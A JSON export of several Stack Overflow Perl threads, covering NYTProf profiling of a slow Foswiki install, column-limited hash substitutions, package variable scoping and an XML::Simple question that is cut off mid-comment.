[{"tags": ["perl", "foswiki", "devel-nytprof"], "answers": [{"comments": [{"owner": {"reputation": 191, "user_id": 2073799, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0083208961047563a7d53298ee068c20?s=128&d=identicon&r=PG", "display_name": "sven.to", "link": "https://stackoverflow.com/users/2073799/sven-to"}, "edited": false, "score": 0, "creation_date": 1447610087, "post_id": 33673681, "comment_id": 55215484, "body": "Thanks, the <code>sigexit</code> option producing a valid profiling result, but because the execution is aborted the result is not very useful. I&#39;ve not much experience with perl. My only assumption is that it could be a memory issue?"}], "tags": [], "owner": {"reputation": 1033, "user_id": 77193, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1cf82705f5ab43c73273ab5d690866b3?s=128&d=identicon&r=PG", "display_name": "Tim Bunce", "link": "https://stackoverflow.com/users/77193/tim-bunce"}, "is_accepted": false, "score": 1, "last_activity_date": 1447338239, "creation_date": 1447338239, "answer_id": 33673681, "question_id": 33660305, "link": "https://stackoverflow.com/questions/33660305/profiling-foswiki-with-nytprof-results-in-incomplete-profile-data/33673681#33673681", "title": "Profiling foswiki with NYTProf results in incomplete profile data", "body": "<blockquote>\n  <p>The script fails with an exit code 141 when I run it with profiler.</p>\n</blockquote>\n\n<p>That suggests the process received a SIGPIPE signal. The <a href=\"https://metacpan.org/pod/Devel::NYTProf#sigexit-1\" rel=\"nofollow\">sigexit</a> option may help.</p>\n\n<blockquote>\n  <p>If I run it without profiler ... it exits successful and producing output.</p>\n</blockquote>\n\n<p>You're using <code>sudo</code> so permissions might be an issue, but that's just a guess. You'll need to dig deeper to confirm if a SIGPIPE is being received and why.</p>\n\n<p>I'm not familiar with foswiki. Perhaps someone in that community could be more helpful.</p>\n"}, {"tags": [], "owner": {"reputation": 91, "user_id": 3087690, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/998c6f846f507bb683badf9a9ff66ebd?s=128&d=identicon&r=PG&f=1", "display_name": "gac410", "link": "https://stackoverflow.com/users/3087690/gac410"}, "is_accepted": false, "score": 2, "last_activity_date": 1448308825, "creation_date": 1448308825, "answer_id": 33879615, "question_id": 33660305, "link": "https://stackoverflow.com/questions/33660305/profiling-foswiki-with-nytprof-results-in-incomplete-profile-data/33879615#33879615", "title": "Profiling foswiki with NYTProf results in incomplete profile data", "body": "<p>I'm not sure why you can't get NYTProfiler to work, we've used it to figure out some performance issues in Foswiki 2.0.2, which have been partially addressed in Foswiki 2.0.3.  There are a couple of issues going on, but one major cause is our conversion to UNICODE internally, and some Perl regex issues in perl versions before 5.20. <a href=\"https://rt.perl.org/Public/Bug/Display.html?id=66852\" rel=\"nofollow\">https://rt.perl.org/Public/Bug/Display.html?id=66852</a>  </p>\n\n<p>Foswiki 2.0.3 made the following performance updates:</p>\n\n<ul>\n<li>Changed some heavily called internal functions from regular expressions, to index()</li>\n<li>Changed EditRowPlugin to generate less html that requires processing by regular expressions in the rendering module.</li>\n<li>Made some other improvements to reduce excessive re-reading of topics.</li>\n</ul>\n\n<p>If 2.0.3 doesn't significantly help, Check to see if the problem pages have large tables in them.  If so, you might try disabling the EditRowPlugin and use EditTablePlugin.</p>\n\n<p>Other than that, you might try our official support channel #foswiki on IRC, <a href=\"http://irclogs.foswiki.org/\" rel=\"nofollow\">http://irclogs.foswiki.org/</a>  </p>\n"}], "owner": {"reputation": 191, "user_id": 2073799, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0083208961047563a7d53298ee068c20?s=128&d=identicon&r=PG", "display_name": "sven.to", "link": "https://stackoverflow.com/users/2073799/sven-to"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 353, "favorite_count": 1, "answer_count": 2, "score": 3, "last_activity_date": 1448308825, "creation_date": 1447277854, "question_id": 33660305, "link": "https://stackoverflow.com/questions/33660305/profiling-foswiki-with-nytprof-results-in-incomplete-profile-data", "title": "Profiling foswiki with NYTProf results in incomplete profile data", "body": "<p><br/>\nI've an foswiki installation which is really slow (~ 60 seconds for a uncached page). I've tried to profile the installation with NYTProf, according to <a href=\"http://foswiki.org/Support/NYTProfDebugging\" rel=\"nofollow\">http://foswiki.org/Support/NYTProfDebugging</a> with the following command:</p>\n\n<pre><code>&gt; sudo -u www-data NYTPROF=\"file=/tmp/nytprof.out:addpid=1:endatexit=1\" perl -wTd:NYTProf view -topic Some.Topic -username MyUsername\n</code></pre>\n\n<p>The script fails with an exit code <code>141</code> when I run it with profiler. If I run it without profiler (remote <code>d:NYTProf</code>) it exits successful and producing output.</p>\n\n<p>After the profiling I've gotten a bunch of profile files in my /tmp directory:</p>\n\n<pre><code>nytprof.out.[841-1860]\n</code></pre>\n\n<p>But when I try to merge these files, I've get an error for the first file:</p>\n\n<pre><code>&gt; nytprofmerge nytprof.out.*\nProfile data incomplete, inflate error -5 ((null)) at end of input file, perhaps the process didn't exit cleanly or the file has been truncated  (refer to TROUBLESHOOTING in the documentation)\n</code></pre>\n\n<p>I can merge the files without the first file, but the results are useless and shows only 87 calls to <code>Foswiki::Sandbox::CORE:open</code> and that's it.</p>\n\n<p>Do I have any chance got get an valid profiling result? Or is there an other tool, that I can use in this case?</p>\n"}, {"tags": ["regex", "perl", "hash", "replace"], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 5183625, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3568ea2b76a30bb701e3a49eace2768?s=128&d=identicon&r=PG&f=1", "display_name": "cmvdi01", "link": "https://stackoverflow.com/users/5183625/cmvdi01"}, "edited": false, "score": 0, "creation_date": 1447275144, "post_id": 33659143, "comment_id": 55092804, "body": "Thank you, I have tried this, but I&#39;m getting references instead of the hash values when I print the output. Any ideas on how to fix this?"}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 1, "creation_date": 1447278026, "post_id": 33659143, "comment_id": 55094269, "body": "always <code>use strict;</code> and <code>use warnings;</code>."}, {"owner": {"reputation": 15376, "user_id": 588916, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b9737fb0439f70903f8948ad3963d9cc?s=128&d=identicon&r=PG", "display_name": "collapsar", "link": "https://stackoverflow.com/users/588916/collapsar"}, "reply_to_user": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1447281814, "post_id": 33659143, "comment_id": 55096132, "body": "@stevieb sure. the  answer contains only a code excerpt, the statements you mention would go at the beginning of the package or script."}, {"owner": {"reputation": 15376, "user_id": 588916, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b9737fb0439f70903f8948ad3963d9cc?s=128&d=identicon&r=PG", "display_name": "collapsar", "link": "https://stackoverflow.com/users/588916/collapsar"}, "reply_to_user": {"reputation": 21, "user_id": 5183625, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3568ea2b76a30bb701e3a49eace2768?s=128&d=identicon&r=PG&f=1", "display_name": "cmvdi01", "link": "https://stackoverflow.com/users/5183625/cmvdi01"}, "edited": false, "score": 0, "creation_date": 1447281906, "post_id": 33659143, "comment_id": 55096169, "body": "@cmvdi01 Sorry for the glitch, I used the wrong variable name. Code corrected."}, {"owner": {"reputation": 28015, "user_id": 63550, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/RIZKi.png?s=128&g=1", "display_name": "Peter Mortensen", "link": "https://stackoverflow.com/users/63550/peter-mortensen"}, "edited": false, "score": 0, "creation_date": 1447282381, "post_id": 33659143, "comment_id": 55096390, "body": "Do you really mean &quot;{cols[0]}&quot; and &quot;{cols[1]}&quot;? (Not &quot;{$cols[0]}&quot; and &quot;{$cols[1]}&quot;?)"}, {"owner": {"reputation": 15376, "user_id": 588916, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b9737fb0439f70903f8948ad3963d9cc?s=128&d=identicon&r=PG", "display_name": "collapsar", "link": "https://stackoverflow.com/users/588916/collapsar"}, "reply_to_user": {"reputation": 28015, "user_id": 63550, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/RIZKi.png?s=128&g=1", "display_name": "Peter Mortensen", "link": "https://stackoverflow.com/users/63550/peter-mortensen"}, "edited": false, "score": 0, "creation_date": 1447282768, "post_id": 33659143, "comment_id": 55096535, "body": "@PeterMortensen You are right of course, another typo (sigh). Thanks for pointing that one out."}, {"owner": {"reputation": 21, "user_id": 5183625, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3568ea2b76a30bb701e3a49eace2768?s=128&d=identicon&r=PG&f=1", "display_name": "cmvdi01", "link": "https://stackoverflow.com/users/5183625/cmvdi01"}, "edited": false, "score": 0, "creation_date": 1447284303, "post_id": 33659143, "comment_id": 55097137, "body": "Thanks for the edits. I&#39;m still getting the references when I use ` if (defined ($hash{$cols[0]})) { $cols[0] = $hash{$cols[0]}; } ` and when I use: ` if (defined ($$hash{$cols[0]})) { $cols[0] = $$hash{$cols[0]}; } ` I get a warning: &quot;Global symbol &quot;$hash&quot; requires explicit package name at...&quot;"}, {"owner": {"reputation": 15376, "user_id": 588916, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b9737fb0439f70903f8948ad3963d9cc?s=128&d=identicon&r=PG", "display_name": "collapsar", "link": "https://stackoverflow.com/users/588916/collapsar"}, "reply_to_user": {"reputation": 21, "user_id": 5183625, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3568ea2b76a30bb701e3a49eace2768?s=128&d=identicon&r=PG&f=1", "display_name": "cmvdi01", "link": "https://stackoverflow.com/users/5183625/cmvdi01"}, "edited": false, "score": 0, "creation_date": 1447285073, "post_id": 33659143, "comment_id": 55097389, "body": "@cmvdi01 You are referring to a hash <i>variable</i> <code>%hash</code> while your original code uses the hash <i>reference</i> <code>$VAR1</code> ( 1 additional layer of indirection). The correct code lines for using <code>%hash</code> are thus  <code>if (defined($hash{$cols[0]})) { $cols[0] = $hash{$cols[0]}; }</code> and its counterpart <code>if (defined($hash{$cols[1]})) { $cols[1] = $hash{$cols[1]}; }</code>."}, {"owner": {"reputation": 21, "user_id": 5183625, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3568ea2b76a30bb701e3a49eace2768?s=128&d=identicon&r=PG&f=1", "display_name": "cmvdi01", "link": "https://stackoverflow.com/users/5183625/cmvdi01"}, "edited": false, "score": 0, "creation_date": 1447285958, "post_id": 33659143, "comment_id": 55097678, "body": "@collapsar I&#39;ve mentioned %hash in my original code as well, that&#39;s probably why it got confusing, sorry. Thanks for the update."}], "tags": [], "owner": {"reputation": 15376, "user_id": 588916, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b9737fb0439f70903f8948ad3963d9cc?s=128&d=identicon&r=PG", "display_name": "collapsar", "link": "https://stackoverflow.com/users/588916/collapsar"}, "is_accepted": true, "score": 1, "last_activity_date": 1447285215, "last_edit_date": 1447285215, "creation_date": 1447273383, "answer_id": 33659143, "question_id": 33659019, "link": "https://stackoverflow.com/questions/33659019/limit-substitutions-to-first-n-instances-per-line-in-perl/33659143#33659143", "title": "Limit substitutions to first n instances per line in Perl", "body": "<p>Just join the columns after the substitutions:</p>\n\n<pre><code>my $line_after_lookup;\nforeach $line (@array) {\n    my @cols = split (/\\s+/, $line);\n\n    if (defined($$VAR1{$cols[0]})) { $cols[0] = $$VAR1{$cols[0]}; }    \n    if (defined($$VAR1{$cols[1]})) { $cols[1] = $$VAR1{$cols[1]}; } \n\n    #\n    # When using a hash instead of a hash reference, replace the previous 2 statements with the following 2 lines:\n    # if (defined($hash{$cols[0]})) { $cols[0] = $hash{$cols[0]}; }\n    # if (defined($hash{$cols[1]})) { $cols[1] = $hash{$cols[1]}; }\n    #\n\n    $line_after_lookup = join ( ' ', @cols );\n    push @newarray, $line_after_lookup ;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 21, "user_id": 5183625, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3568ea2b76a30bb701e3a49eace2768?s=128&d=identicon&r=PG&f=1", "display_name": "cmvdi01", "link": "https://stackoverflow.com/users/5183625/cmvdi01"}, "edited": false, "score": 0, "creation_date": 1447284587, "post_id": 33660652, "comment_id": 55097219, "body": "Your code works fine when I&#39;m reading directly from the file, but it doesn&#39;t work with the array where my data are stored (@array). Any alternatives to replace <code>while (&lt;IN&gt;)</code> by `foreach $line (@array)&#180;? Thank you."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 21, "user_id": 5183625, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3568ea2b76a30bb701e3a49eace2768?s=128&d=identicon&r=PG&f=1", "display_name": "cmvdi01", "link": "https://stackoverflow.com/users/5183625/cmvdi01"}, "edited": false, "score": 0, "creation_date": 1447314053, "post_id": 33660652, "comment_id": 55105910, "body": "Yes, you should be able to do that. I wanted to make sure my example was runnable. Note, the above breaks if there is no hash element to look up."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 21, "user_id": 5183625, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3568ea2b76a30bb701e3a49eace2768?s=128&d=identicon&r=PG&f=1", "display_name": "cmvdi01", "link": "https://stackoverflow.com/users/5183625/cmvdi01"}, "edited": false, "score": 0, "creation_date": 1447315438, "post_id": 33660652, "comment_id": 55106523, "body": "Just bear in mind that split acts implicitly on $_ by default.  So you can do <code>foreach (@lines) { my @fields = split ;... </code>"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 0, "last_activity_date": 1447279165, "creation_date": 1447279165, "answer_id": 33660652, "question_id": 33659019, "link": "https://stackoverflow.com/questions/33659019/limit-substitutions-to-first-n-instances-per-line-in-perl/33660652#33660652", "title": "Limit substitutions to first n instances per line in Perl", "body": "<p>This does the trick:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse Data::Dumper; \n\nmy %substitute = (\n    'a'  =&gt; 'GAT_1',\n    'b'  =&gt; 'GAT_2',\n    'cc' =&gt; 'GAT_3',\n    'd'  =&gt; 'GAT_4',\n    'gg' =&gt; 'GAT_5',\n    'hh' =&gt; 'GAT_6',\n);\n\nmy @newarray;\n\nwhile (&lt;DATA&gt;) {\n    my @fields = split;\n    $fields[0] = $substitute{ $fields[0] };\n    $fields[1] = $substitute{ $fields[1] };\n    push ( @newarray, join( \" \", @fields ));\n}\n\nprint Dumper \\@newarray;\n\n__DATA__\n    a b abbd\n    cc d abcd\n    gg hh cdag\n</code></pre>\n\n<p>Prints:</p>\n\n<pre><code>$VAR1 = [\n          'GAT_1 GAT_2 abbd',\n          'GAT_3 GAT_4 abcd',\n          'GAT_5 GAT_6 cdag'\n        ];\n</code></pre>\n\n<p>Yours isn't working because you're changing the contents of <code>@fields</code> not <code>$line</code>. However another possible gotcha is your split - <code>split /\\s+/</code> handles leading whitespace differently (you get an empty field). </p>\n"}, {"comments": [{"owner": {"reputation": 2285, "user_id": 1916711, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8ebc3c1d0b082618f5db9b06b44c6a2?s=128&d=identicon&r=PG", "display_name": "arayq2", "link": "https://stackoverflow.com/users/1916711/arayq2"}, "reply_to_user": {"reputation": 21, "user_id": 5183625, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3568ea2b76a30bb701e3a49eace2768?s=128&d=identicon&r=PG&f=1", "display_name": "cmvdi01", "link": "https://stackoverflow.com/users/5183625/cmvdi01"}, "edited": false, "score": 0, "creation_date": 1447298035, "post_id": 33661820, "comment_id": 55101075, "body": "The subroutines replace() and convert() should be easy to figure out.  The key operation is the s///e substitution expression.  The <code>e</code> modifier causes the second part of the s/// to be evaluated (so that convert() gets called).  The 3 arguments come from the first part: <code>\\b</code> for a word boundary, <code>(\\w+)</code> to capture word characters, <code>(\\W+)</code> to capture non-word characters, i.e. spaces, punctuation, etc, and then <code>(\\w+)</code> again to capture the second sequence of word characters.   There is no need to split or parse the entire line."}, {"owner": {"reputation": 28015, "user_id": 63550, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/RIZKi.png?s=128&g=1", "display_name": "Peter Mortensen", "link": "https://stackoverflow.com/users/63550/peter-mortensen"}, "edited": false, "score": 0, "creation_date": 1447361777, "post_id": 33661820, "comment_id": 55135397, "body": "@arayq2: It is better if you edit the explanation into your answer."}], "tags": [], "owner": {"reputation": 2285, "user_id": 1916711, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8ebc3c1d0b082618f5db9b06b44c6a2?s=128&d=identicon&r=PG", "display_name": "arayq2", "link": "https://stackoverflow.com/users/1916711/arayq2"}, "is_accepted": false, "score": 0, "last_activity_date": 1447425344, "last_edit_date": 1447425344, "creation_date": 1447284611, "answer_id": 33661820, "question_id": 33659019, "link": "https://stackoverflow.com/questions/33659019/limit-substitutions-to-first-n-instances-per-line-in-perl/33661820#33661820", "title": "Limit substitutions to first n instances per line in Perl", "body": "<p><em>How can I limit the replacement of only the first two instances (columns) of the matching keys? (i.e. leaving the third column unchanged?)</em> </p>\n\n<p>One way would be to use a regular expression that picks off just those two columns and performs the appropriate substitutions.</p>\n\n<p>Illustration (edited):</p>\n\n<pre><code>#!/usr/bin/perl\n\nmy @array = (\n    \"a b abbd\",\n    \"cc d abcd\",\n    \"gg hh cdag\",\n    \"ii jj kmln\"  # to show what happens when no mapping exists \n);\n\nmy %hash = (\n'a' =&gt; 'GAT_1',\n'b' =&gt; 'GAT_2',\n'cc' =&gt; 'GAT_3',\n'd' =&gt; 'GAT_4',\n'gg' =&gt; 'GAT_5',\n'hh' =&gt; 'GAT_6',\n);\n\nsub replace { $hash{$_[0]} || $_[0]; } # original string if no mapped value\n\nsub convert { replace($_[0]) . $_[1] . replace($_[2]); }\n\nmy @newarray = map\n{\n    my $line = $_;\n    $line =~ s/(\\w+)(\\W+)(\\w+)/convert($1, $2, $3)/e;\n    $line;\n} @array;\n\nprint \"$_\\n\" for @newarray;\n</code></pre>\n\n<p>The needed substitutions occur here:</p>\n\n<pre><code>    $line =~ s/(\\w+)(\\W+)(\\w+)/convert($1, $2, $3)/e;\n</code></pre>\n\n<p>The <code>e</code> modifier on the <code>s///</code> expression causes the replacement expression in the second part to be evaluated, so that sub convert() is called.  The arguments to convert() come from the captures in the regular expression of the first part: <code>(\\w+)</code> to capture the first sequence of word characters, <code>(\\W+)</code> to capture non-word characters such as white space or punctuation, and <code>(\\w+)</code> again to capture the second sequence of word characters.  The rest of the line being irrelevant need not be parsed at all and is left as is.   </p>\n\n<p>You may also need to think about what happens if a mapped value isn't available.  The code above leaves the original strings intact in such cases.</p>\n"}], "owner": {"reputation": 21, "user_id": 5183625, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3568ea2b76a30bb701e3a49eace2768?s=128&d=identicon&r=PG&f=1", "display_name": "cmvdi01", "link": "https://stackoverflow.com/users/5183625/cmvdi01"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 199, "favorite_count": 0, "accepted_answer_id": 33659143, "answer_count": 3, "score": 0, "last_activity_date": 1447425344, "creation_date": 1447272789, "last_edit_date": 1495539874, "question_id": 33659019, "link": "https://stackoverflow.com/questions/33659019/limit-substitutions-to-first-n-instances-per-line-in-perl", "title": "Limit substitutions to first n instances per line in Perl", "body": "<p>I have a similar situation to Stack Overflow post <em><a href=\"https://stackoverflow.com/questions/22863313/substituting-array-elements-from-one-tab-delimited-file-with-hash-values-from-an\">Substituting array elements from one tab delimited file with hash values from another file using Perl</a></em>. I am trying to replace a string that matches hash keys by their respective values in specific columns.</p>\n\n<pre><code>    Given the @array:\n\n    a b abbd\n    cc d abcd\n    gg hh cdag\n\nand the %hash:\n\n$VAR1 = {\n    'a'  =&gt; 'GAT_1',\n    'b'  =&gt; 'GAT_2',\n    'cc' =&gt; 'GAT_3',\n    'd'  =&gt; 'GAT_4',\n    'gg' =&gt; 'GAT_5',\n    'hh' =&gt; 'GAT_6',\n};\n</code></pre>\n\n<p>I've tried this code, but it doesn't work. How can I limit the replacement of only the first two instances (columns) of the matching keys?\n(that is, leaving the third column unchanged?)</p>\n\n<pre><code>foreach $line (@array) {\n    my @cols = split (/\\s+/, $line);\n    $cols[0] = $hash{cols[0]};\n    $cols[1] = $hash{cols[1]};\n    push @newarray, $line;\n}\n\n\nExpected output:\nGAT_1 GAT_2 abbd\nGAT_3 GAT_4 abcd\nGAT_5 GAT_6 cdag\n</code></pre>\n"}, {"tags": ["perl", "package", "scoping"], "answers": [{"tags": [], "owner": {"reputation": 15376, "user_id": 588916, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b9737fb0439f70903f8948ad3963d9cc?s=128&d=identicon&r=PG", "display_name": "collapsar", "link": "https://stackoverflow.com/users/588916/collapsar"}, "is_accepted": true, "score": 3, "last_activity_date": 1447269269, "creation_date": 1447269269, "answer_id": 33658131, "question_id": 33657938, "link": "https://stackoverflow.com/questions/33657938/perl-package-variables-without-using-our/33658131#33658131", "title": "Perl package variables without using our", "body": "<p>You need to reference the correct package name: <code>$verbose</code> does not reside in package <code>C</code> but in <code>A::B::C</code>. So the following works as expected:</p>\n\n<pre><code>BEGIN {\n    $A::B::C::verbose = 0; # Changed\n}\n\nsub INFO {\n    my $msg = shift;\n\n    if ($A::B::C::verbose) { # Changed\n        print(\"$msg\\n\");\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 35, "user_id": 1525734, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/285582bb32edceaf57bcb09c2da8c8aa?s=128&d=identicon&r=PG", "display_name": "luigi", "link": "https://stackoverflow.com/users/1525734/luigi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 70, "favorite_count": 0, "accepted_answer_id": 33658131, "answer_count": 1, "score": 1, "last_activity_date": 1447269269, "creation_date": 1447268596, "question_id": 33657938, "link": "https://stackoverflow.com/questions/33657938/perl-package-variables-without-using-our", "title": "Perl package variables without using our", "body": "<p>Is it possible to set a package variable without using our.</p>\n\n<p>Here's a code sample that would explain the case better than words:</p>\n\n<pre><code>package A::B::C;\n\nuse strict;\nuse warnings;\nuse Exporter ();\nour @ISA = qw/Exporter/;\nour @EXPORT = ();\nour @EXPORT_OK = qw/INFO/;\nour %EXPORT_TAGS = (\n    default =&gt; [qw/INFO/]\n);\nExporter::export_ok_tags(\"default\");\n\nBEGIN {\n    $C::verbose = 0;\n}\n\nsub INFO {\n    my $msg = shift;\n\n    if ($C::verbose) {\n        print(\"$msg\\n\");\n    }\n}\n</code></pre>\n\n<p>Setting the variable $verbose from a script that uses package A::B::C does not change the value of $verbose in the package:</p>\n\n<pre><code>use A::B::C;\n\n$A::B::C::verbose = 1;\n</code></pre>\n\n<p>I perfectly know that using 'our' in the package would solve the issue, but I'm more interested to know what's happening and why it's not possible to set the variable $verbose from a script that uses package A::B::C. Or even better, what happens to package variables that are only used (and not formally declared) in package subroutines; what scope do they get?</p>\n"}, {"tags": ["xml", "perl", "xml-simple"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1447266349, "post_id": 33656776, "comment_id": 55087868, "body": "See also: <a href=\"http://stackoverflow.com/q/33267765/589924\">Why is XML::Simple \u201cDiscouraged\u201d?</a>"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447270087, "post_id": 33656776, "comment_id": 55090143, "body": "Give us some sample XML, and we can give you a better answer. Being able to use XML based constructs mean the code is way less of a headache."}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 5085585, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lsb8e.gif?s=128&g=1", "display_name": "Calbrenar", "link": "https://stackoverflow.com/users/5085585/calbrenar"}, "edited": false, "score": 0, "creation_date": 1447269368, "post_id": 33657297, "comment_id": 55089705, "body": "Thank you so much.  I actually read through several of your previous answers while trying to figure this out.  I&#39;m sure I can backtrack what you did to figure out how to get to the id or a property value.  Many thanks!"}, {"owner": {"reputation": 31, "user_id": 5085585, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lsb8e.gif?s=128&g=1", "display_name": "Calbrenar", "link": "https://stackoverflow.com/users/5085585/calbrenar"}, "edited": false, "score": 0, "creation_date": 1447274649, "post_id": 33657297, "comment_id": 55092547, "body": "I added a simple print on $name $id and $props.  $name works but I get use of uninitialized value for the lines using id and props and for the print statement for id and prompts.  I assumed props would be another hash or array reference right with potentially another array/hash inside it?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 31, "user_id": 5085585, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lsb8e.gif?s=128&g=1", "display_name": "Calbrenar", "link": "https://stackoverflow.com/users/5085585/calbrenar"}, "edited": false, "score": 0, "creation_date": 1447275564, "post_id": 33657297, "comment_id": 55093006, "body": "You appear to have changed something seeing as what I had posted didn&#39;t even compile. I removed the extraneous <code>$</code>, and now it runs fine (tested)."}, {"owner": {"reputation": 31, "user_id": 5085585, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lsb8e.gif?s=128&g=1", "display_name": "Calbrenar", "link": "https://stackoverflow.com/users/5085585/calbrenar"}, "edited": false, "score": 0, "creation_date": 1447276113, "post_id": 33657297, "comment_id": 55093293, "body": "This is what I put in -- <a href=\"http://pastebin.com/yj9kAPM4D\" rel=\"nofollow noreferrer\">pastebin.com/yj9kAPM4D</a>  The first two work fine the second two give unitialized values  and a bunch of open filehandle errors  <a href=\"http://pastebin.com/BrviDSy7\" rel=\"nofollow noreferrer\">pastebin.com/BrviDSy7</a>  Thanks again for your help.  What&#39;s the best thing to look up for a tutorial on this?  It seems like it&#39;s mixed across hashes and references."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 31, "user_id": 5085585, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lsb8e.gif?s=128&g=1", "display_name": "Calbrenar", "link": "https://stackoverflow.com/users/5085585/calbrenar"}, "edited": false, "score": 0, "creation_date": 1447276336, "post_id": 33657297, "comment_id": 55093416, "body": "<code>skullCapBrown</code> doesn&#39;t exist anywhere in the XML, so you couldn&#39;t possibly have gotten that output."}, {"owner": {"reputation": 31, "user_id": 5085585, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lsb8e.gif?s=128&g=1", "display_name": "Calbrenar", "link": "https://stackoverflow.com/users/5085585/calbrenar"}, "edited": false, "score": 0, "creation_date": 1447276457, "post_id": 33657297, "comment_id": 55093482, "body": "The xml file is too big to put on pastebin so I only had one of the &lt;item&gt; values there&#39;s several hundred I think.  Here&#39;s the full file  <a href=\"https://www.dropbox.com/s/fycg9f0sd9tbtzh/items.xml?dl=0\" rel=\"nofollow noreferrer\">dropbox.com/s/fycg9f0sd9tbtzh/items.xml?dl=0</a>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 31, "user_id": 5085585, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lsb8e.gif?s=128&g=1", "display_name": "Calbrenar", "link": "https://stackoverflow.com/users/5085585/calbrenar"}, "edited": false, "score": 0, "creation_date": 1447276534, "post_id": 33657297, "comment_id": 55093525, "body": 